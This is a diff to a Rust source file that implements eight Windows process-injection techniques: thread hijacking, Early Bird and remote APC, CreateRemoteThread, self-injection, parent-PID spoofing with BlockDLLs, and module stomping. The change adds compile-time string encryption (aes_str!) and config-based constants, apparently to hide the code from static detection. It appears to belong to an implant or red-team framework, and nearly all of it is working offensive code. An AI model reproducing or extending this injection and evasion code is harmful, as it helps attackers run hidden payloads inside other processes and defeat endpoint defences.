@@ -8,22 +8,32 @@ use std::ffi::c_void;
 use std::ptr;
 use std::mem;
 use std::ffi::CString;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
+
+// Shorthand for the typed Win32 FFI config (values mirror winnt.h). The
+// mirrored constants in bindings.rs stay as compile-time declarations;
+// runtime call sites read the typed config instead.
+#[inline]
+fn ffi() -> &'static crate::config::FfiWindowsConfig {
+    &crate::config::config().ffi_windows
+}
 
 // --- IMPLEMENTATIONS ---
 
 // 1. Remote Hijack (Aggressive)
 pub unsafe fn inject_remote_hijack(pid: u32, shellcode: &[u8]) -> Result<String, String> {
-    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+    let h_process = OpenProcess(ffi().process_all_access, 0, pid);
     if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }
 
-    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if addr.is_null() { CloseHandle(h_process); return Err("Alloc failed".to_string()); }
+    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
+    if addr.is_null() { CloseHandle(h_process); return Err(aes_str!("Alloc failed")); }
 
     let mut written = 0;
     WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
 
     let mut old = 0;
-    VirtualProtectEx(h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+    VirtualProtectEx(h_process, addr, shellcode.len(), ffi().page_execute_read, &mut old);
 
     let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     let mut te: THREADENTRY32 = mem::zeroed();
@@ -38,10 +48,10 @@ pub unsafe fn inject_remote_hijack(pid: u32, shellcode: &[u8]) -> Result<String,
     }
     CloseHandle(h_snapshot);
 
-    if target_tid == 0 { CloseHandle(h_process); return Err("No threads found".to_string()); }
+    if target_tid == 0 { CloseHandle(h_process); return Err(aes_str!("No threads found")); }
 
     let h_thread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, 0, target_tid);
-    if h_thread.is_null() { CloseHandle(h_process); return Err("OpenThread failed".to_string()); }
+    if h_thread.is_null() { CloseHandle(h_process); return Err(aes_str!("OpenThread failed")); }
 
     SuspendThread(h_thread);
     let mut ctx: CONTEXT = mem::zeroed();
@@ -58,19 +68,19 @@ pub unsafe fn inject_remote_hijack(pid: u32, shellcode: &[u8]) -> Result<String,
 
 // 2. Early Bird (Stealthy)
 pub unsafe fn inject_early_bird(binary: &str, shellcode: &[u8]) -> Result<String, String> {
-    let app_name = CString::new(binary).map_err(|_| "Invalid string")?;
+    let app_name = CString::new(binary).map_err(|_| aes_str!("Invalid string"))?;
     let mut si: STARTUPINFOA = mem::zeroed(); si.cb = mem::size_of::<STARTUPINFOA>() as u32;
     let mut pi: PROCESS_INFORMATION = mem::zeroed();
 
-    if CreateProcessA(app_name.as_ptr() as *mut _, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) == 0 {
+    if CreateProcessA(app_name.as_ptr() as *mut _, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, ffi().create_suspended, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) == 0 {
         return Err(format!("CreateProcess failed: {}", GetLastError()));
     }
 
-    let addr = VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    let addr = VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
     let mut written = 0;
     WriteProcessMemory(pi.h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
     let mut old = 0;
-    VirtualProtectEx(pi.h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+    VirtualProtectEx(pi.h_process, addr, shellcode.len(), ffi().page_execute_read, &mut old);
 
     QueueUserAPC(addr as *const c_void, pi.h_thread, 0);
     ResumeThread(pi.h_thread);
@@ -83,14 +93,14 @@ pub unsafe fn inject_early_bird(binary: &str, shellcode: &[u8]) -> Result<String
 
 // 3. Remote APC
 pub unsafe fn inject_remote_apc(pid: u32, shellcode: &[u8]) -> Result<String, String> {
-    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+    let h_process = OpenProcess(ffi().process_all_access, 0, pid);
     if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }
 
-    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
     let mut written = 0;
     WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
     let mut old = 0;
-    VirtualProtectEx(h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+    VirtualProtectEx(h_process, addr, shellcode.len(), ffi().page_execute_read, &mut old);
 
     let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     let mut te: THREADENTRY32 = mem::zeroed(); te.dw_size = mem::size_of::<THREADENTRY32>() as u32;
@@ -111,22 +121,22 @@ pub unsafe fn inject_remote_apc(pid: u32, shellcode: &[u8]) -> Result<String, St
     CloseHandle(h_snapshot);
     CloseHandle(h_process);
     
-    if count > 0 { Ok(format!("Queued APC to {} threads", count)) } else { Err("Failed to queue APC".to_string()) }
+    if count > 0 { Ok(format!("Queued APC to {} threads", count)) } else { Err(aes_str!("Failed to queue APC")) }
 }
 
 // 4. Classic Remote Thread (Stable)
 pub unsafe fn inject_remote_create_thread(pid: u32, shellcode: &[u8]) -> Result<String, String> {
-    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+    let h_process = OpenProcess(ffi().process_all_access, 0, pid);
     if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }
 
-    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if addr.is_null() { CloseHandle(h_process); return Err("Alloc failed".to_string()); }
+    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
+    if addr.is_null() { CloseHandle(h_process); return Err(aes_str!("Alloc failed")); }
 
     let mut written = 0;
     WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
 
     let mut old = 0;
-    VirtualProtectEx(h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+    VirtualProtectEx(h_process, addr, shellcode.len(), ffi().page_execute_read, &mut old);
 
     let mut tid = 0;
     let h_thread = CreateRemoteThread(h_process, ptr::null_mut(), 0, addr, ptr::null_mut(), 0, &mut tid);
@@ -146,29 +156,29 @@ pub unsafe fn inject_remote_create_thread(pid: u32, shellcode: &[u8]) -> Result<
 
 // 5. Self Injection
 pub unsafe fn inject_self(shellcode: &[u8]) -> Result<String, String> {
-    let addr = VirtualAlloc(ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if addr.is_null() { return Err("Self Alloc Failed".to_string()); }
+    let addr = VirtualAlloc(ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
+    if addr.is_null() { return Err(aes_str!("Self Alloc Failed")); }
 
     ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
 
     let mut old = 0;
-    VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+    VirtualProtect(addr, shellcode.len(), ffi().page_execute_read, &mut old);
 
     let mut tid = 0;
     let h_thread = CreateThread(ptr::null_mut(), 0, addr, ptr::null_mut(), 0, &mut tid);
     
-    if h_thread.is_null() { return Err("CreateThread Failed".to_string()); }
+    if h_thread.is_null() { return Err(aes_str!("CreateThread Failed")); }
     CloseHandle(h_thread);
 
-    Ok("Self injection running in new thread".to_string())
+    Ok(aes_str!("Self injection running in new thread"))
 }
 
 // 6. Advanced Spawn (PPID Spoofing + BlockDLLs)
 // NOTE: Syscall wrapper removed to ensure stability (fallback to VirtualAllocEx)
 pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[u8]) -> Result<String, String> {
     // A. Open Parent
-    let h_parent = OpenProcess(PROCESS_ALL_ACCESS, 0, parent_pid);
-    if h_parent.is_null() { return Err("Failed to open Parent PID".to_string()); }
+    let h_parent = OpenProcess(ffi().process_all_access, 0, parent_pid);
+    if h_parent.is_null() { return Err(aes_str!("Failed to open Parent PID")); }
 
     // B. Initialize Attributes
     let mut size: SIZE_T = 0;
@@ -178,22 +188,22 @@ pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[
     let lp_attr_list = attr_list_buffer.as_mut_ptr() as *mut c_void;
 
     if InitializeProcThreadAttributeList(lp_attr_list, 2, 0, &mut size) == 0 {
-        CloseHandle(h_parent); return Err("Init Attributes failed".into());
+        CloseHandle(h_parent); return Err(aes_str!("Init Attributes failed"));
     }
 
     // C. Set PPID
     if UpdateProcThreadAttribute(lp_attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &h_parent as *const _ as *const c_void, mem::size_of::<HANDLE>(), ptr::null_mut(), ptr::null_mut()) == 0 {
-         return Err("Set PPID failed".into());
+         return Err(aes_str!("Set PPID failed"));
     }
 
     // D. Set BlockDLLs
     let policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
     if UpdateProcThreadAttribute(lp_attr_list, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy as *const _ as *const c_void, mem::size_of::<u64>(), ptr::null_mut(), ptr::null_mut()) == 0 {
-        return Err("Set BlockDLLs failed".into());
+        return Err(aes_str!("Set BlockDLLs failed"));
     }
 
     // E. Create Process with Extended Attributes
-    let app_name = CString::new(binary).map_err(|_| "Invalid string")?;
+    let app_name = CString::new(binary).map_err(|_| aes_str!("Invalid string"))?;
     let mut si_ex: STARTUPINFOEXA = mem::zeroed();
     si_ex.startup_info.cb = mem::size_of::<STARTUPINFOEXA>() as u32;
     si_ex.lp_attribute_list = lp_attr_list;
@@ -203,7 +213,7 @@ pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[
     let success = CreateProcessA(
         app_name.as_ptr() as *mut _, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 
         0, 
-        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, 
+        EXTENDED_STARTUPINFO_PRESENT | ffi().create_suspended, 
         ptr::null_mut(), ptr::null_mut(), 
         &mut si_ex.startup_info as *mut _ as *mut STARTUPINFOA, 
         &mut pi
@@ -215,7 +225,7 @@ pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[
     if success == 0 { return Err(format!("CreateProcess failed: {}", GetLastError())); }
 
     // F. Injection via Standard API (Stable)
-    let addr = VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    let addr = VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
     if addr.is_null() {
         let _ = CloseHandle(pi.h_process);
         return Err(format!("Alloc failed: {}", GetLastError()));
@@ -225,7 +235,7 @@ pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[
     WriteProcessMemory(pi.h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
     
     let mut old = 0;
-    VirtualProtectEx(pi.h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+    VirtualProtectEx(pi.h_process, addr, shellcode.len(), ffi().page_execute_read, &mut old);
 
     QueueUserAPC(addr as *const c_void, pi.h_thread, 0);
     ResumeThread(pi.h_thread);
@@ -239,20 +249,20 @@ pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[
 
 // 7. Module Stomping (Manual/Specific)
 pub unsafe fn inject_module_stomping(pid: u32, dll_name: &str, shellcode: &[u8]) -> Result<String, String> {
-    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
-    if h_process.is_null() { return Err("OpenProcess failed".into()); }
+    let h_process = OpenProcess(ffi().process_all_access, 0, pid);
+    if h_process.is_null() { return Err(aes_str!("OpenProcess failed")); }
 
-    let kernel32_str = CString::new("kernel32.dll").unwrap();
-    let loadlib_str = CString::new("LoadLibraryA").unwrap();
+    let kernel32_str = CString::new(aes_str!("kernel32.dll")).unwrap();
+    let loadlib_str = CString::new(aes_str!("LoadLibraryA")).unwrap();
     
     let h_kernel32 = GetModuleHandleA(kernel32_str.as_ptr() as *mut _);
     let p_load_lib = GetProcAddress(h_kernel32, loadlib_str.as_ptr() as *mut _);
 
-    if p_load_lib.is_null() { CloseHandle(h_process); return Err("Failed to find LoadLibraryA".into()); }
+    if p_load_lib.is_null() { CloseHandle(h_process); return Err(aes_str!("Failed to find LoadLibraryA")); }
 
-    let dll_cstr = CString::new(dll_name).map_err(|_| "Invalid DLL string")?;
+    let dll_cstr = CString::new(dll_name).map_err(|_| aes_str!("Invalid DLL string"))?;
     let dll_path_len = dll_name.len() + 1;
-    let p_dll_path = VirtualAllocEx(h_process, ptr::null_mut(), dll_path_len, MEM_COMMIT, PAGE_READWRITE);
+    let p_dll_path = VirtualAllocEx(h_process, ptr::null_mut(), dll_path_len, ffi().mem_commit, ffi().page_readwrite);
     
     let mut written = 0;
     WriteProcessMemory(h_process, p_dll_path, dll_cstr.as_ptr() as *const c_void, dll_path_len, &mut written);
@@ -262,12 +272,12 @@ pub unsafe fn inject_module_stomping(pid: u32, dll_name: &str, shellcode: &[u8])
     CloseHandle(h_thread);
 
     // Fallback to alloc for stability
-    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
     
     let mut written = 0;
     WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
     let mut old = 0;
-    VirtualProtectEx(h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+    VirtualProtectEx(h_process, addr, shellcode.len(), ffi().page_execute_read, &mut old);
     
     let mut tid = 0;
     CreateRemoteThread(h_process, ptr::null_mut(), 0, addr, ptr::null_mut(), 0, &mut tid);
@@ -278,8 +288,8 @@ pub unsafe fn inject_module_stomping(pid: u32, dll_name: &str, shellcode: &[u8])
 
 // 8. Module Stomping (Auto-Discovery)
 pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<String, String> {
-    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
-    if h_process.is_null() { return Err("[-] OpenProcess failed".to_string()); }
+    let h_process = OpenProcess(ffi().process_all_access, 0, pid);
+    if h_process.is_null() { return Err(aes_str!("[-] OpenProcess failed")); }
 
     // STEP 1: Enumerate modules
     let mut h_mods: [HMODULE; 1024] = [ptr::null_mut(); 1024];
@@ -293,7 +303,7 @@ pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<
         LIST_MODULES_ALL,
     ) == 0 {
         CloseHandle(h_process);
-        return Err("[-] EnumProcessModulesEx failed".to_string());
+        return Err(aes_str!("[-] EnumProcessModulesEx failed"));
     }
 
     let num_mods = cb_needed / std::mem::size_of::<HMODULE>() as u32;
@@ -311,9 +321,9 @@ pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<
 
         // [CRITICAL FIX] Blacklist Dangerous/System DLLs
         if name_lower.ends_with(".exe") || 
-           name_lower == "ntdll.dll" || 
-           name_lower == "kernel32.dll" || 
-           name_lower == "kernelbase.dll" {
+           name_lower == aes_str!("ntdll.dll") || 
+           name_lower == aes_str!("kernel32.dll") || 
+           name_lower == aes_str!("kernelbase.dll") {
             continue;
         }
 
@@ -377,15 +387,15 @@ pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<
 
     if let Some((text_addr, mod_name)) = chosen_mod {
         let mut old_protect = 0;
-        if VirtualProtectEx(h_process, text_addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
+        if VirtualProtectEx(h_process, text_addr, shellcode.len(), ffi().page_execute_readwrite, &mut old_protect) == 0 {
             CloseHandle(h_process);
-            return Err("[-] VirtualProtectEx failed".to_string());
+            return Err(aes_str!("[-] VirtualProtectEx failed"));
         }
 
         let mut written = 0;
         if WriteProcessMemory(h_process, text_addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written) == 0 {
             CloseHandle(h_process);
-            return Err("[-] WriteProcessMemory failed".to_string());
+            return Err(aes_str!("[-] WriteProcessMemory failed"));
         }
 
         let mut tmp = 0;
@@ -395,7 +405,7 @@ pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<
         let h_thread = CreateRemoteThread(h_process, ptr::null_mut(), 0, text_addr, ptr::null_mut(), 0, &mut tid);
         if h_thread.is_null() {
             CloseHandle(h_process);
-            return Err("[-] CreateRemoteThread failed".to_string());
+            return Err(aes_str!("[-] CreateRemoteThread failed"));
         }
 
         CloseHandle(h_thread);
@@ -404,5 +414,5 @@ pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<
     }
 
     CloseHandle(h_process);
-    Err("[-] No suitable module found to stomp".to_string())
+    Err(aes_str!("[-] No suitable module found to stomp"))
 }
